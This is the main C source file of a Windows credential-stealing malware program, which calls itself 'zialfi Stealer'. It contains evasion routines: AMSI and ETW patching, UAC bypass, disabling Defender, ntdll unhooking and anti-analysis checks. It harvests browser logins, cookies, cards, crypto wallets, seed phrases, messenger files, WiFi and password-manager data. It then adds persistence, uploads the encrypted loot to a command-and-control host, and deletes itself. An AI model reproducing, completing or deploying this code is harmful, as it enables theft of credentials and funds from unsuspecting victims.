#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>
#include "config.h"
#include "engine.h"
#include "peb.h"
#include "hash.h"
#include "export_resolve.h"
#include "enc_strings.h"
#include "chromium.h"
#include "firefox.h"
#include "wallets.h"
#include "messengers.h"
#include "lz4.h"

#ifdef ENABLE_SLEEP_OBFUSCATION
#include "sleep_obfusc.h"
static void mirage_sleep(DWORD ms) { ekko_sleep(ms); }
#else
static void mirage_sleep(DWORD ms) { if (main_k32_ensure_api()) g_main_k32.pSlp(ms); }
#endif

#ifdef ENABLE_SYSTEM_INFO
extern int mirage_collect_system_info(char *output, size_t outlen);
#endif
#ifdef ENABLE_KEYLOGGER
#include "keylogger.h"
#endif
#ifdef ENABLE_SCREENSHOT
#include "screenshot.h"
#endif
#ifdef ENABLE_CLIPBOARD
#include "clipboard.h"
#endif
#ifdef ENABLE_FILE_GRABBER
#include "grabber.h"
#endif
#ifdef ENABLE_SEED_PHRASE_GRABBER
#include "seed_grabber.h"
#endif
#ifdef ENABLE_CLIPPER
#include "clipper.h"
#endif
#ifdef ENABLE_GAMING_STEAM
#include "gaming.h"
#endif
#ifdef ENABLE_VPN_NORDVPN
#include "vpn.h"
#endif
#ifdef ENABLE_2FA_GOOGLE
#include "twofa.h"
#endif
#ifdef ENABLE_PM_BITWARDEN
#include "passman.h"
#endif

/* ── Evasion ──────────────────────────────────────────────────── */
#ifdef ENABLE_AMSI_BYPASS
#include "amsi_bypass.h"
#endif
#ifdef ENABLE_ETW_BYPASS
#include "etw_bypass.h"
#endif
#ifdef ENABLE_UAC_BYPASS
#include "uac_bypass.h"
#endif
#ifdef ENABLE_PEB_HIDE
#include "peb_hide.h"
#endif
#ifdef ENABLE_DEFENDER_DISABLE
#include "defender_disable.h"
#endif
#ifdef ENABLE_ANTI_ANALYSIS
#include "anti_analysis.h"
#endif
#ifdef ENABLE_MUTEX
#include "mutex.h"
#endif
#ifdef ENABLE_UNHOOK_NTDLL
#include "unhook.h"
#endif
#ifdef ENABLE_STACK_SPOOF
#include "stack_spoof.h"
#endif

/* ── Cleanup ──────────────────────────────────────────────────── */
#ifdef ENABLE_PERSISTENCE
#include "persistence.h"
#endif
#ifdef ENABLE_SELF_DELETE
#include "self_delete.h"
#endif
#ifdef ENABLE_TEMP_WIPE
#include "temp_wipe.h"
#endif

#ifdef ENABLE_WIFI_PASSWORDS
#include "wifi.h"
#endif

/* ── C2 Exfil ─────────────────────────────────────────────────── */
#ifdef ENABLE_C2_EXFIL
#include "panel_http.h"
#endif
#ifdef ENABLE_C2_EXFIL
#include "archive_crypt.h"
#endif
#ifdef ENABLE_C2_EXFIL
#include "chunked.h"
#endif

#ifdef ENABLE_C2_EXFIL
#include "file_utils.h"
#include "packer.h"
#include <stdint.h>
#endif

/* ── PEB-walk singleton for main.c kernel32/shell32 APIs ──────── */
typedef BOOL    (WINAPI *pCreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES);
typedef BOOL    (WINAPI *pCopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef DWORD   (WINAPI *pGetTempPathA)(DWORD, LPSTR);
typedef DWORD   (WINAPI *pGetTickCount_t)(void);
typedef DWORD   (WINAPI *pGetCurrentProcessId_t)(void);
typedef VOID    (WINAPI *pExitProcess)(UINT);
typedef DWORD   (WINAPI *pGetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
typedef VOID    (WINAPI *pSleep)(DWORD);
typedef UINT    (WINAPI *pWinExec)(LPCSTR, UINT);
typedef HRESULT (WINAPI *pSHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);

static struct {
    pCreateDirectoryA       pCDA;
    pCopyFileA              pCFA;
    pGetTempPathA           pGTP;
    pGetTickCount_t         pGTC;
    pGetCurrentProcessId_t  pGCPI;
    pExitProcess            pEP;
    pGetModuleFileNameA_t   pGMFNA;
    pSleep                  pSlp;
    pWinExec                pWE;
    int                     ready;
} g_main_k32;

static struct {
    pSHGetFolderPathA       pSHGFP;
    int                     ready;
} g_main_shell32;

static int main_k32_ensure_api(void) {
    if (g_main_k32.ready) return 1;
    char dll[32]; char fn[32];
    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;
    enc_decrypt(enc_CreateDirectoryA, ENC_CREATEDIRECTORYA_LEN, fn);
    g_main_k32.pCDA = (pCreateDirectoryA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_CopyFileA, ENC_COPYFILEA_LEN, fn);
    g_main_k32.pCFA = (pCopyFileA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_GetTempPathA, ENC_GETTEMPPATHA_LEN, fn);
    g_main_k32.pGTP = (pGetTempPathA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_GetTickCount, ENC_GETTICKCOUNT_LEN, fn);
    g_main_k32.pGTC = (pGetTickCount_t)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_GetCurrentProcessId, ENC_GETCURRENTPROCESSID_LEN, fn);
    g_main_k32.pGCPI = (pGetCurrentProcessId_t)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_ExitProcess, ENC_EXITPROCESS_LEN, fn);
    g_main_k32.pEP = (pExitProcess)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_GetModuleFileNameA, ENC_GETMODULEFILENAMEA_LEN, fn);
    g_main_k32.pGMFNA = (pGetModuleFileNameA_t)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_Sleep, ENC_SLEEP_LEN, fn);
    g_main_k32.pSlp = (pSleep)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_WinExec, ENC_WINEXEC_LEN, fn);
    g_main_k32.pWE = (pWinExec)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    if (!g_main_k32.pCDA || !g_main_k32.pCFA || !g_main_k32.pGTP ||
        !g_main_k32.pGTC || !g_main_k32.pGCPI || !g_main_k32.pEP ||
        !g_main_k32.pGMFNA || !g_main_k32.pSlp || !g_main_k32.pWE)
        return 0;
    g_main_k32.ready = 1;
    return 1;
}

static int main_shell32_ensure_api(void) {
    if (g_main_shell32.ready) return 1;
    char dll[32]; char fn[32];
    enc_decrypt(enc_shell32, ENC_SHELL32_LEN, dll);
    void *s32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!s32) return 0;
    enc_decrypt(enc_SHGetFolderPathA, ENC_SHGETFOLDERPATHA_LEN, fn);
    g_main_shell32.pSHGFP = (pSHGetFolderPathA)mirage_get_function_by_hash(s32, mirage_encrypted_hash_func(fn));
    if (!g_main_shell32.pSHGFP) return 0;
    g_main_shell32.ready = 1;
    return 1;
}

static void get_appdata_local(char *buf, size_t len) {
    if (main_shell32_ensure_api() &&
        g_main_shell32.pSHGFP(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, buf) == S_OK)
        return;
    snprintf(buf, len, "C:\\Users\\%s\\AppData\\Local", getenv("USERNAME") ? getenv("USERNAME") : "user");
}

static void get_appdata_roaming(char *buf, size_t len) {
    if (main_shell32_ensure_api() &&
        g_main_shell32.pSHGFP(NULL, CSIDL_APPDATA, NULL, 0, buf) == S_OK)
        return;
    snprintf(buf, len, "C:\\Users\\%s\\AppData\\Roaming", getenv("USERNAME") ? getenv("USERNAME") : "user");
}

static void write_string_array(const char *path, char **items, size_t count) {
    FILE *f = fopen(path, "a");
    if (!f) return;
    for (size_t i = 0; i < count; i++) {
        if (items[i])
            fprintf(f, "%s\n", items[i]);
    }
    fclose(f);
}

static void save_browser_data(const char *output_dir, const char *prefix, CollectResult *result) {
    for (size_t i = 0; i < result->count; i++) {
        BrowserData *b = &result->data[i];
        char path[MAX_PATH];

        if (b->logins && b->login_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_logins.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->logins, b->login_count);
            dbg_printf("[+] %s logins: %zu -> %s\n", prefix, b->login_count, path);
        }

        if (b->cookies && b->cookie_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_cookies.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->cookies, b->cookie_count);
            dbg_printf("[+] %s cookies: %zu -> %s\n", prefix, b->cookie_count, path);
        }

        if (b->history && b->history_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_history.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->history, b->history_count);
            dbg_printf("[+] %s history: %zu -> %s\n", prefix, b->history_count, path);
        }

        if (b->cards && b->card_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_cards.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->cards, b->card_count);
            dbg_printf("[+] %s cards: %zu -> %s\n", prefix, b->card_count, path);
        }

        if (b->autofill && b->autofill_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_autofill.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->autofill, b->autofill_count);
            dbg_printf("[+] %s autofill: %zu -> %s\n", prefix, b->autofill_count, path);
        }

        if (b->bookmarks && b->bookmark_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_bookmarks.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->bookmarks, b->bookmark_count);
            dbg_printf("[+] %s bookmarks: %zu -> %s\n", prefix, b->bookmark_count, path);
        }
    }
}

static void save_messenger_files(const char *output_dir, const char *subdir, MessengerResult *m) {
    if (!m->files || m->count == 0) return;

    char dest_dir[MAX_PATH];
    snprintf(dest_dir, sizeof(dest_dir), "%s\\%s", output_dir, subdir);
    g_main_k32.pCDA(dest_dir, NULL);

    for (size_t i = 0; i < m->count; i++) {
        if (!m->files[i]) continue;
        const char *fname = strrchr(m->files[i], '\\');
        if (!fname) fname = strrchr(m->files[i], '/');
        if (!fname) continue;
        fname++;

        char dest[MAX_PATH];
        snprintf(dest, sizeof(dest), "%s\\%s", dest_dir, fname);
        g_main_k32.pCFA(m->files[i], dest, FALSE);
        dbg_printf("[+] Copied %s -> %s\n", m->files[i], dest);
    }
}

static void save_text_to_file(const char *path, const char *text) {
    FILE *f = fopen(path, "w");
    if (!f) return;
    fprintf(f, "%s", text);
    fclose(f);
    dbg_printf("[+] Saved %s\n", path);
}

int main(int argc, char *argv[]) {
#ifdef ZIALFI_TEST_MODE
    if (argc > 1 && strcmp(argv[1], "--test") == 0) {
        /* Internal self-test mode — no-op, CI uses external test binaries */
        return 0;
    }
#endif
    if (!main_k32_ensure_api()) return 1;

    /* ── Evasion first ────────────────────────────────────── */
#ifndef ZIALFI_TEST_MODE
#ifdef ENABLE_MUTEX
    if (!mirage_ensure_mutex()) return 0;
#endif
#ifdef ENABLE_ANTI_ANALYSIS
    {
        mirage_analysis_result ar = mirage_anti_analysis_run();
        if (mirage_anti_analysis_should_exit(ar)) return 0;
    }
#endif
#ifdef ENABLE_UAC_BYPASS
    if (!mirage_is_elevated()) {
        if (!main_k32_ensure_api()) return 0;
        char exe_path[MAX_PATH];
        DWORD path_len2 = g_main_k32.pGMFNA(NULL, exe_path, sizeof(exe_path));
        if (path_len2 > 0 && path_len2 < sizeof(exe_path)) {
            mirage_uac_bypass(exe_path);
        }
        g_main_k32.pEP(0);
    }
#endif
#endif /* !ZIALFI_TEST_MODE */
#ifdef ENABLE_AMSI_BYPASS
    mirage_patch_amsi();
#endif
#ifdef ENABLE_ETW_BYPASS
    mirage_patch_etw();
#endif
#ifdef ENABLE_PEB_HIDE
    mirage_hide_self();
#endif
#ifdef ENABLE_DEFENDER_DISABLE
    mirage_disable_defender();
#endif

    dbg_printf("[*] zialfi Stealer (C11) starting...\n");

    char tmpdir[MAX_PATH], local[MAX_PATH], roaming[MAX_PATH], output_dir[MAX_PATH];
    g_main_k32.pGTP(MAX_PATH, tmpdir);
    /* Generate random dir name to avoid detection */
    srand(g_main_k32.pGTC());
    snprintf(output_dir, sizeof(output_dir), "%s\\%08x",
             tmpdir, (unsigned)(rand() ^ (unsigned)g_main_k32.pGCPI()));
    g_main_k32.pCDA(output_dir, NULL);

    get_appdata_local(local, sizeof(local));
    get_appdata_roaming(roaming, sizeof(roaming));

    dbg_printf("[+] Local:  %s\n", local);
#ifdef ENABLE_UNHOOK_NTDLL
    unhook_ntdll();
    dbg_printf("[+] NTDLL unhooked\n");
#endif

    dbg_printf("[+] Roaming: %s\n", roaming);
    dbg_printf("[+] Output: %s\n", output_dir);

    int ok = mirage_syscall_resolve();
    if (ok) {
        dbg_printf("[+] Syscalls resolved (indirect)\n");
        mirage_init_gadget_pool();
#ifdef ENABLE_STACK_SPOOF
        spoof_init();
        dbg_printf("[+] Stack spoofing ready\n");
#endif

        dbg_printf("[+] Gadget pool filled\n");
    } else {
        dbg_printf("[!] PEB walk failed — using fallback WinAPI\n");
    }

#ifdef ENABLE_CHROMIUM_STEALER
    /* App-Bound COM requires GUI session — skip fork in headless mode */
    dbg_printf("[*] Chromium...\n");
    CollectResult chrome = collect_chromium(local, roaming);
    dbg_printf("[+] Chromium: %zu browsers\n", chrome.count);
    save_browser_data(output_dir, "chromium", &chrome);
    free_browser_data(&chrome);
#endif

#ifdef ENABLE_FIREFOX_STEALER
    dbg_printf("[*] Firefox...\n");
    CollectResult ff = collect_firefox(roaming);
    dbg_printf("[+] Firefox: %zu browsers\n", ff.count);
    save_browser_data(output_dir, "firefox", &ff);
    free_firefox_data(&ff);
#endif

#ifdef ENABLE_WALLET_EXTENSIONS
    dbg_printf("[*] Wallets...\n");
    CollectResult wallets = collect_wallets(local, roaming);
    dbg_printf("[+] Wallets: %zu\n", wallets.count);
    save_browser_data(output_dir, "wallets", &wallets);
    free_browser_data(&wallets);
#endif

    dbg_printf("[*] Messengers...\n");
    MessengerData messengers = collect_messengers(roaming, local);
    dbg_printf("[+] Discord: %zu, Telegram: %zu, Signal: %zu\n",
           messengers.discord.count, messengers.telegram.count, messengers.signal.count);
    save_messenger_files(output_dir, "discord", &messengers.discord);
    save_messenger_files(output_dir, "telegram", &messengers.telegram);
    save_messenger_files(output_dir, "signal", &messengers.signal);
    save_messenger_files(output_dir, "whatsapp", &messengers.whatsapp);
    save_messenger_files(output_dir, "skype", &messengers.skype);
    save_messenger_files(output_dir, "viber", &messengers.viber);
    save_messenger_files(output_dir, "element", &messengers.element);
    save_messenger_files(output_dir, "session", &messengers.session);
    save_messenger_files(output_dir, "tox", &messengers.tox);
    save_messenger_files(output_dir, "icq", &messengers.icq);
    save_messenger_files(output_dir, "pidgin", &messengers.pidgin);
    save_messenger_files(output_dir, "outlook", &messengers.outlook);
    save_messenger_files(output_dir, "jabber", &messengers.jabber);
    save_messenger_files(output_dir, "microsip", &messengers.microsip);
    free_messenger_data(&messengers);

#ifdef ENABLE_SYSTEM_INFO
    dbg_printf("[*] System info...\n");
    char sys_info[4096] = {0};
    mirage_collect_system_info(sys_info, sizeof(sys_info));
    {
        char si_path[MAX_PATH];
        snprintf(si_path, sizeof(si_path), "%s\\system_info.txt", output_dir);
        save_text_to_file(si_path, sys_info);
    }
    dbg_printf("[+] System info OK\n");
#endif

#ifdef ENABLE_SCREENSHOT
    char ss_path[MAX_PATH];
    snprintf(ss_path, sizeof(ss_path), "%s\\screenshot.bmp", output_dir);
    dbg_printf("[*] Screenshot...\n");
    if (screenshot_capture(ss_path) == 0)
        dbg_printf("[+] Screenshot: %s\n", ss_path);
    else
        dbg_printf("[!] Screenshot failed\n");
#endif

#ifdef ENABLE_CLIPBOARD
    char clip_buf[4096] = {0};
    dbg_printf("[*] Clipboard...\n");
    int clip_len = clipboard_get_text(clip_buf, sizeof(clip_buf));
    if (clip_len > 0) {
        char clip_path[MAX_PATH];
        snprintf(clip_path, sizeof(clip_path), "%s\\clipboard.txt", output_dir);
        save_text_to_file(clip_path, clip_buf);
#ifdef ENABLE_CLIPPER
        /* Check clipboard for crypto addresses, log if found */
        int addr_type = clipper_detect_address(clip_buf);
        if (addr_type > 0) {
            dbg_printf("[+] Clipper: address type %d detected in clipboard\n", addr_type);
        }
#endif
    }
    dbg_printf("[+] Clipboard: %d bytes\n", clip_len);
#endif

#ifdef ENABLE_SEED_PHRASE_GRABBER
    dbg_printf("[*] Seed phrase scan...\n");
    {
        char seed_buf[16384] = {0};
        if (seed_grabber_collect(seed_buf, sizeof(seed_buf)) == 0 && seed_buf[0]) {
            char seed_path[MAX_PATH];
            snprintf(seed_path, sizeof(seed_path), "%s\\seed_phrases.txt", output_dir);
            save_text_to_file(seed_path, seed_buf);
        }
    }
#endif

#ifdef ENABLE_WIFI_PASSWORDS
    dbg_printf("[*] WiFi passwords...\n");
    {
        char wifi_buf[4096] = {0};
        mirage_collect_wifi_passwords(wifi_buf, sizeof(wifi_buf));
        if (wifi_buf[0]) {
            char wifi_path[MAX_PATH];
            snprintf(wifi_path, sizeof(wifi_path), "%s\\wifi.txt", output_dir);
            save_text_to_file(wifi_path, wifi_buf);
        }
    }
#endif

#ifdef ENABLE_KEYLOGGER
    dbg_printf("[+] Keylogger: available (run interactively)\n");
#endif

#ifdef ENABLE_FILE_GRABBER
    dbg_printf("[*] File grabber...\n");
    int grabbed = grabber_collect(output_dir, 100);
    dbg_printf("[+] Grabbed %d files\n", grabbed);
#endif

#ifdef ENABLE_GAMING_STEAM
    dbg_printf("[*] Gaming...\n");
    gaming_collect_all(output_dir);
#endif

#ifdef ENABLE_VPN_NORDVPN
    dbg_printf("[*] VPN...\n");
    int vpn_files = vpn_collect(output_dir);
    dbg_printf("[+] VPN: %d files\n", vpn_files);
#endif

#ifdef ENABLE_2FA_GOOGLE
    dbg_printf("[*] 2FA...\n");
    twofa_collect(output_dir);
#endif

#ifdef ENABLE_PM_BITWARDEN
    dbg_printf("[*] Password managers...\n");
    passman_collect(output_dir);
#endif

    dbg_printf("[*] Done. Output: %s\n", output_dir);

    /* ── Persistence ───────────────────────────────────────────── */
#ifdef ENABLE_PERSISTENCE
    {
        char exe_path[MAX_PATH];
        DWORD path_len = g_main_k32.pGMFNA(NULL, exe_path, sizeof(exe_path));
        if (path_len > 0 && path_len < sizeof(exe_path)) {
            PersistResult pr = persistence_install(exe_path);
            (void)pr;
        }
    }
#endif

    /* ── C2 Exfil ──────────────────────────────────────────────── */
    int exfil_ok = 0;
#ifdef ENABLE_C2_EXFIL
    {
        size_t archive_len = 0;
        unsigned char *archive = pack_and_encrypt_dir(output_dir, &archive_len);
        if (archive) {
            char metadata[256];
            snprintf(metadata, sizeof(metadata),
                     "{\"host\":\"%s\",\"user\":\"%s\"}",
                     "unknown", getenv("USERNAME") ? getenv("USERNAME") : "unknown");
            /* upload_log: 0 = HTTP 200 confirmed, -1 = failure.
             * exfil_ok gates loot-dir removal below — only wipe after
             * the panel actually accepted the archive. */
            exfil_ok = (upload_log(C2_HOST, C2_PORT, C2_TOKEN,
                                   archive, archive_len, metadata) == 0);
            free(archive);
        }
    }
#endif

    /* ── Wipe temp ─────────────────────────────────────────────── */
#ifdef ENABLE_TEMP_WIPE
    temp_wipe_directory();
#endif

    /* ── Remove output dir (only if exfil OK, to avoid data loss) ── */
#if !defined(ENABLE_C2_EXFIL) || defined(ZIALFI_TEST_MODE)
    {
        char del_path[MAX_PATH + 8];
        snprintf(del_path, sizeof(del_path), "rmdir /s /q \"%s\"", output_dir);
        g_main_k32.pWE(del_path, SW_HIDE);
    }
#else
    if (exfil_ok) {
        char del_path[MAX_PATH + 8];
        snprintf(del_path, sizeof(del_path), "rmdir /s /q \"%s\"", output_dir);
        g_main_k32.pWE(del_path, SW_HIDE);
    }
#endif

    /* ── Self-delete (last) ────────────────────────────────────── */
#ifdef ENABLE_SELF_DELETE
    self_delete_run();
#endif

    return 0;
}
